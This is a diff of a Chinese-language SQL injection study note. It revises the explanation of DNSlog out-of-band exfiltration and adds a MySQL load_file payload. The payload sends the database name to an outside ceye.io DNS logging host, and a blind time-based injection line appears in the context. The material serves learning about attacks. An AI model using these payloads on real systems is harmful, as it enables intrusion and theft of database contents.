@@ -367,11 +367,9 @@ select * from users where name='vince' and if(substr(database(),1,1)='p',sleep(5
 
 ### 原理
 
-1.提交数据拼接`load_file('//database().xx.xx.xx')`
+1.目标数据库直接拼接SQL语句执行后访问DNS服务器查询`database().xx.xx.xx`对应IP
 
-2.目标数据库直接拼接SQL语句执行后访问DNS服务器查询`database().xx.xx.xx`对应IP
-
-3.目标数据库到我方DNS服务器查询IP时保留查询日志`database().xx.xx.xx`
+2.目标数据库到我方DNS服务器查询IP时保留查询日志`database().xx.xx.xx`
 
 
 
@@ -380,6 +378,15 @@ select * from users where name='vince' and if(substr(database(),1,1)='p',sleep(5
 1.目标Mysql开启secure_file_priv=""配置
 
 2.目标Mysql数据库可以访问外网
+
+
+
+```shell
+select load_file(concat('//',(select database()),'.c6wuas.ceye.io/abc'))
+select load_file(concat('//',(指定SQL语句),'.指定通信网站'))
+```
+
+![DNSlog带出日志](images/DNSlog带出日志.png)
 
 
 
